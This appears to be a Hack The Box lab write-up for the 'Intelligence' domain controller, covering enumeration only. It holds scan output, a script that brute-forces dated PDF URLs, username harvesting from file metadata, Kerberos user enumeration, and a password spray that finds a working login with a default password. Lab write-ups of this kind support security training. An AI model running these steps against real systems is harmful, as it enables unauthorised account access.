# Intelligence

Completed: Yes Created: October 7, 2021 1:46 PM Platform: Hack The Box

## Enumeration

### Nmap

```bash
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-07 17:54:31Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49701/tcp open  msrpc         Microsoft Windows RPC
49713/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
```

### dns

```bash
dig axfr @10.10.10.248                  

; <<>> DiG 9.16.15-Debian <<>> axfr @10.10.10.248
; (1 server found)
;; global options: +cmd
;; Query time: 4240 msec
;; SERVER: 10.10.10.248#53(10.10.10.248)
;; WHEN: Thu Oct 07 07:19:46 EDT 2021
;; MSG SIZE  rcvd: 28
```

```bash
dig any @10.10.10.248 intelligence.htb                                                                                                                                                                                               9 ⨯

; <<>> DiG 9.16.15-Debian <<>> any @10.10.10.248 intelligence.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 18333
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 4, AUTHORITY: 0, ADDITIONAL: 3

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;intelligence.htb.              IN      ANY

;; ANSWER SECTION:
intelligence.htb.       600     IN      A       10.10.10.248
intelligence.htb.       3600    IN      NS      dc.intelligence.htb.
intelligence.htb.       3600    IN      SOA     dc.intelligence.htb. hostmaster.intelligence.htb. 75 900 600 86400 3600
intelligence.htb.       600     IN      AAAA    dead:beef::23b

;; ADDITIONAL SECTION:
dc.intelligence.htb.    1200    IN      A       10.10.10.248
dc.intelligence.htb.    1200    IN      AAAA    dead:beef::23b

;; Query time: 72 msec
;; SERVER: 10.10.10.248#53(10.10.10.248)
;; WHEN: Thu Oct 07 07:22:12 EDT 2021
;; MSG SIZE  rcvd: 197
```

### http

IIS 10.0. `contact@intelligence.htb`

On the site, there are 2 documents. Checked the metadata the first one:

```bash
┌──(root💀kali)-[~/…/Medium/Intelligence/enum/http]
└─# exiftool 2020-12-15-upload.pdf 
ExifTool Version Number         : 12.31
File Name                       : 2020-12-15-upload.pdf
Directory                       : .
File Size                       : 27 KiB
File Modification Date/Time     : 2021:10:07 07:37:49-04:00
File Access Date/Time           : 2021:10:07 07:38:04-04:00
File Inode Change Date/Time     : 2021:10:07 07:37:49-04:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : Jose.Williams
```

`Creator : William.Lee`

`Creator : Jose.Williams`

Using IIS-Shortname-Scanning:

```bash
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/10/07 07:48:48
Target: http://intelligence.htb/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 11

Finished in: 1 second(s)

Press ENTER to quit...
```

The target is vulnerable, now we can try to brute force it further:

```bash
Testing request method: "OPTIONS" with magic part: "\a.aspx" ...
Dir: DOCUME~1
File: INDEX~1.HTM
[|] INDEX~1.HTT
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/10/07 07:50:08
Target: http://intelligence.htb/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 284
  |_ Identified directories: 1
    |_ DOCUME~1
  |_ Indentified files: 1
    |_ INDEX~1.HTM
      |_ Actual file name = INDEX

Finished in: 5 second(s)

Press ENTER to quit...
```

Let's try it against the documents folder:

```bash
# IIS Short Name (8.3) Scanner version 2.3.9 (05 February 2017) - scan initiated 2021/10/07 07:51:43
Target: http://intelligence.htb/documents/
|_ Result: Vulnerable!
|_ Used HTTP method: OPTIONS
|_ Suffix (magic part): \a.aspx
|_ Extra information:
  |_ Number of sent requests: 9445
  |_ Identified directories: 0
  |_ Indentified files: 106
    |_ 200106~1.PDF
    |_ 2003A2~1.PDF
    |_ 200AFA~1.PDF
    |_ 200B04~1.PDF
    |_ 200D0E~1.PDF
    |_ 200D51~1.PDF
    |_ 20119C~1.PDF
    |_ 20128A~1.PDF
    |_ 2012F2~1.PDF
    |_ 20133C~1.PDF
    |_ 201423~1.PDF
    |_ 20169A~1.PDF
    |_ 201AE1~1.PDF
    |_ 2020-0~1.PDF
    |_ 2020-0~2.PDF
    |_ 2020-0~3.PDF
    |_ 2020-1~1.PDF
    |_ 2020-1~2.PDF
    |_ 2020-1~3.PDF
    |_ 2021-0~1.PDF
    |_ 2021-0~2.PDF
    |_ 2021-0~3.PDF
    |_ 20225E~1.PDF
    |_ 2023F8~1.PDF
    |_ 20270A~1.PDF
    |_ 202987~1.PDF
    |_ 202CAC~1.PDF
    |_ 202D01~1.PDF
    |_ 202E41~1.PDF
    |_ 203055~1.PDF
    |_ 2036B6~1.PDF
    |_ 203DFD~1.PDF
    |_ 203F52~1.PDF
    |_ 203F66~1.PDF
    |_ 2045B9~1.PDF
    |_ 204FB4~1.PDF
    |_ 205105~1.PDF
    |_ 205686~1.PDF
    |_ 205D09~1.PDF
    |_ 205E50~1.PDF
    |_ 205F7A~1.PDF
    |_ 2064AA~1.PDF
    |_ 206BEA~1.PDF
    |_ 206EAE~1.PDF
    |_ 20717C~1.PDF
    |_ 207754~1.PDF
    |_ 207A06~1.PDF
    |_ 207FC3~1.PDF
    |_ 208174~1.PDF
    |_ 208424~1.PDF
    |_ 208840~1.PDF
    |_ 209030~1.PDF
    |_ 20935A~1.PDF
    |_ 2094B9~1.PDF
    |_ 209504~1.PDF
    |_ 209652~1.PDF
    |_ 209A91~1.PDF
    |_ 209BF9~1.PDF
    |_ 20A06A~1.PDF
    |_ 20A3EC~1.PDF
    |_ 20A528~1.PDF
    |_ 20A7A5~1.PDF
    |_ 20A94E~1.PDF
    |_ 20AE9F~1.PDF
    |_ 20B0F0~1.PDF
    |_ 20B120~1.PDF
    |_ 20B269~1.PDF
    |_ 20B4CD~1.PDF
    |_ 20B6A8~1.PDF
    |_ 20BAB9~1.PDF
    |_ 20BAEA~1.PDF
    |_ 20BB05~1.PDF
    |_ 20BC94~1.PDF
    |_ 20C212~1.PDF
    |_ 20C41C~1.PDF
    |_ 20C83F~1.PDF
    |_ 20C8A0~1.PDF
    |_ 20C966~1.PDF
    |_ 20CBCA~1.PDF
    |_ 20D0FA~1.PDF
    |_ 20D337~1.PDF
    |_ 20D478~1.PDF
    |_ 20D610~1.PDF
    |_ 20D732~1.PDF
    |_ 20D89A~1.PDF
    |_ 20DA7E~1.PDF
    |_ 20DB5D~1.PDF
    |_ 20DBAD~1.PDF
    |_ 20E2BA~1.PDF
    |_ 20E4D2~1.PDF
    |_ 20E791~1.PDF
    |_ 20F0BF~1.PDF
    |_ 20F307~1.PDF
    |_ 20F5BA~1.PDF
    |_ 20F674~1.PDF
    |_ 20F968~1.PDF
    |_ BG-MAS~1.JPG
    |_ BG-SIG~1.JPG
    |_ BOOTST~1.JS
      |_ Actual extension = .JS
    |_ BOOTST~1.JS??
    |_ DEMO-I~1.JPG
    |_ DEMO-I~2.JPG
    |_ JQUERY~1.JS
      |_ Actual extension = .JS
    |_ JQUERY~1.JS??
    |_ JQUERY~2.JS
      |_ Actual extension = .JS
    |_ JQUERY~2.JS??
```

Too much content here. So, we know the formats of filenames. Let's brute the date and download the files with python:

```python
import requests

for i in range(0, 13):
    month = str(i).zfill(2)
    for j in range(0, 31):
        day = str(j).zfill(2)
        url = f'http://intelligence.htb/documents/2020-{month}-{day}-upload.pdf'
        res = requests.get(url)
        if res.text.find('404 - File or directory not found.') < 0:
            pdf = res.content
            with open(f'{month}-{day}.pdf', 'wb') as f:
                f.write(pdf)
```

After you got all pdf files, extract names from it with:

```bash
┌──(root💀kali)-[~/…/Intelligence/enum/http/enum-pdf]
└─# exiftool *.pdf | grep Creator | cut -f2 -d':' | tr -d ' ' > ../usernames2.txt
```

On 06-04.pdf, I found the following text:

```
New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

And another on on 12-30.pdf:

```
Internal IT Update
There has recently been some outages on our web servers. Ted has gotten a
script in place to help notify us if this happens again.
Also, after discussion following our recent security audit we are in the process
of locking down our service accounts.
```

### Kerberos

Tried to enumerate usernames, but got nothing:

```bash
┌──(root💀kali)-[~/tools/kerbrute/dist]
└─# ./kerbrute_linux_amd64 userenum -d intelligence.htb --dc 10.10.10.248  ~/tools/SecLists/Usernames/Names/names.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 10/07/21 - Ronnie Flathers @ropnop

2021/10/07 08:02:22 >  Using KDC(s):
2021/10/07 08:02:22 >   10.10.10.248:88

2021/10/07 08:03:36 >  Done! Tested 10177 usernames (0 valid) in 73.261 seconds
```

Okay, I didn't find the right users at first, but after web enumeration, I got them:

```bash
┌──(root💀kali)-[~/tools/kerbrute/dist]
└─# ./kerbrute_linux_amd64 userenum -d intelligence.htb --dc 10.10.10.248 ~/repos/vuln-boxes/HackTheBox/Medium/Intelligence/enum/http/usernames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 10/07/21 - Ronnie Flathers @ropnop

2021/10/07 08:48:46 >  Using KDC(s):
2021/10/07 08:48:46 >   10.10.10.248:88

2021/10/07 08:48:46 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 08:48:46 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/10/07 08:48:46 >  Done! Tested 10 usernames (2 valid) in 0.077 seconds
```

Lol, again use kerbrute to check all usernames from web enum:

```bash
┌──(root💀kali)-[~/tools/kerbrute/dist]
└─# ./kerbrute_linux_amd64 userenum -d intelligence.htb --dc 10.10.10.248 ~/repos/vuln-boxes/HackTheBox/Medium/Intelligence/enum/http/usernames2.txt                                                                                   130 ⨯

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 10/07/21 - Ronnie Flathers @ropnop

2021/10/07 09:23:05 >  Using KDC(s):
2021/10/07 09:23:05 >   10.10.10.248:88

2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Danny.Matthews@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Daniel.Shelton@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Brian.Morris@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jennifer.Thomas@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Thomas.Valenzuela@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Darryl.Harris@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Reed@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Scott.Scott@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Veronica.Patel@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Nicole.Brock@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       David.Mcbride@intelligence.htb
2021/10/07 09:23:05 >  [+] VALID USERNAME:       John.Coleman@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Jason.Wright@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Richard.Williams@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Teresa.Williamson@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Jessica.Moody@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Anita.Roberts@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Brian.Baker@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Kaitlyn.Zimmerman@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Stephanie.Young@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Samuel.Richardson@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Tiffany.Molina@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Travis.Evans@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Kelly.Long@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       David.Wilson@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Ian.Duncan@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Jason.Patterson@intelligence.htb
2021/10/07 09:23:06 >  [+] VALID USERNAME:       Thomas.Hall@intelligence.htb
2021/10/07 09:23:06 >  Done! Tested 84 usernames (84 valid) in 0.647 seconds
```

They are all valid 😵

### SMB

Nothing with `smbclient`, `nmap smb-enum` or `enum4linux`.

```bash
crackmapexec smb 10.10.10.248 -u '' -p '' --shares                                                                                                                                                                                 130 ⨯
[*] First time use detected
[*] Creating home directory structure
[*] Creating default workspace
[*] Initializing MSSQL protocol database
[*] Initializing LDAP protocol database
[*] Initializing WINRM protocol database
[*] Initializing SMB protocol database
[*] Initializing SSH protocol database
[*] Copying default configuration file
[*] Generating SSL certificate
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\: STATUS_ACCESS_DENIED 
SMB         10.10.10.248    445    DC               [-] Error enumerating shares: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
```

Final brute force with crackmapexec:

```bash
┌──(root💀kali)-[~/…/Medium/Intelligence/enum/http]
└─# crackmapexec smb 10.10.10.248 -u usernames2.txt -p NewIntelligenceCorpUser9876 
SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876
```

## Gaining access

